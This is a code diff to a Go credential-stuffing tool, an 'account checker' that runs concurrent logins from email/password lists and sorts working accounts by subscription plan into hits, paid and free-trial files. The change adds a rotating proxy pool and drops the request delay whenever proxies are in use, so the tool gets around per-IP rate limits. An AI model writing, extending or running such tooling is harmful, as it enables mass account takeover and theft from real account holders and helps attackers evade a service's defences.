@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"net/url"
 	"os"
 	"path/filepath"
 	"sync"
@@ -14,6 +15,7 @@ type RunOptions struct {
 	AccountsPath string
 	ResultsDir   string
 	Workers      int
+	ProxyPath    string
 }
 
 func runChecker(opts RunOptions) (RunStats, time.Duration, error) {
@@ -40,6 +42,14 @@ func runChecker(opts RunOptions) (RunStats, time.Duration, error) {
 		return RunStats{}, 0, fmt.Errorf("checker init: %w", err)
 	}
 
+	var proxyPool *ProxyPool
+	if opts.ProxyPath != "" {
+		proxyPool, err = LoadProxyPool(opts.ProxyPath)
+		if err != nil {
+			return RunStats{}, 0, fmt.Errorf("proxy: %w", err)
+		}
+	}
+
 	baseDir := exeDir()
 	resultsDir := opts.ResultsDir
 	if resultsDir == "" {
@@ -54,16 +64,24 @@ func runChecker(opts RunOptions) (RunStats, time.Duration, error) {
 	fmt.Printf("  Config   : %s\n", opts.ConfigPath)
 	fmt.Printf("  Accounts : %s (%d lines)\n", opts.AccountsPath, len(accounts))
 	fmt.Printf("  Workers  : %d  |  Delay: %dms  |  Retry: %d\n", w, cfg.Settings.DelayMS, cfg.Settings.RetryOnError)
+	if proxyPool != nil {
+		fmt.Printf("  Proxy    : %s (%d entries, rotating)\n", opts.ProxyPath, proxyPool.Len())
+	} else {
+		fmt.Println("  Proxy    : off (direct connection)")
+	}
 	fmt.Printf("  Output   : %s\n", resultsDir)
 	fmt.Println("============================================================")
 	fmt.Println()
 
 	jobs := make(chan Account, w*2)
 	var wg sync.WaitGroup
-	var hitCount, failCount, errCount, rateCount, verifyCount atomic.Int64
+	var hitCount, failCount, errCount, rateCount, verifyCount, inactiveCount atomic.Int64
 	var fileMu sync.Mutex
 	start := time.Now()
 	delay := time.Duration(cfg.Settings.DelayMS) * time.Millisecond
+	if proxyPool != nil {
+		delay = 0
+	}
 
 	for i := 0; i < w; i++ {
 		wg.Add(1)
@@ -73,7 +91,11 @@ func runChecker(opts RunOptions) (RunStats, time.Duration, error) {
 				if delay > 0 {
 					time.Sleep(delay)
 				}
-				res := checker.Check(acc.Email, acc.Password)
+				var proxy *url.URL
+				if proxyPool != nil {
+					proxy = proxyPool.Next()
+				}
+				res := checker.Check(acc.Email, acc.Password, proxy)
 				switch res.Status {
 				case StatusHit:
 					hitCount.Add(1)
@@ -96,6 +118,16 @@ func runChecker(opts RunOptions) (RunStats, time.Duration, error) {
 				case StatusVerifyRequired:
 					verifyCount.Add(1)
 					fmt.Printf("[SKIP] %s | Facebook verification required", acc.Email)
+					if res.PlanName != "" {
+						fmt.Printf(" (Plan=%s)", res.PlanName)
+					}
+					fmt.Println()
+					fileMu.Lock()
+					_ = writeResultFiles(cfg, res, resultsDir)
+					fileMu.Unlock()
+				case StatusPlanInactive:
+					inactiveCount.Add(1)
+					fmt.Printf("[SKIP] %s | %s", acc.Email, res.Reason)
 					if res.PlanName != "" {
 						fmt.Printf(" (Plan=%s)", res.PlanName)
 					}
@@ -127,20 +159,22 @@ func runChecker(opts RunOptions) (RunStats, time.Duration, error) {
 		Fails:       failCount.Load(),
 		RateLimited: rateCount.Load(),
 		VerifySkip:  verifyCount.Load(),
+		InactiveSkip: inactiveCount.Load(),
 		Errors:      errCount.Load(),
 	}
 
 	_ = writeRunSummary(filepath.Join(resultsDir, "summary.txt"), cfg, opts, stats, elapsed)
 
 	fmt.Println("------------------------------------------------------------")
-	fmt.Printf("Done in %s | HIT=%d FAIL=%d SKIP=%d RATE=%d ERROR=%d\n",
-		elapsed, stats.Hits, stats.Fails, stats.VerifySkip, stats.RateLimited, stats.Errors)
+	fmt.Printf("Done in %s | HIT=%d FAIL=%d FB=%d INACTIVE=%d RATE=%d ERROR=%d\n",
+		elapsed, stats.Hits, stats.Fails, stats.VerifySkip, stats.InactiveSkip, stats.RateLimited, stats.Errors)
 	fmt.Printf("Results folder:\n  %s\n", filepath.Clean(resultsDir))
 	fmt.Println("  summary.txt      — full run stats")
 	fmt.Println("  hits.txt           — valid logins + active plan")
 	fmt.Println("  by_plan/           — PRO, FREE_TRIAL, PAID...")
 	fmt.Println("  paid.txt / free_trial.txt")
 	fmt.Println("  facebook_verify.txt — login ok but Facebook verify wall")
+	fmt.Println("  inactive_plan.txt   — paid label but no billing / legacy pricing")
 	fmt.Println("  invalid.txt        — wrong password")
 	fmt.Println("  rate_limited.txt   — HTTP 429 (retry with 3 workers)")
 	fmt.Println("  errors.txt         — other errors")
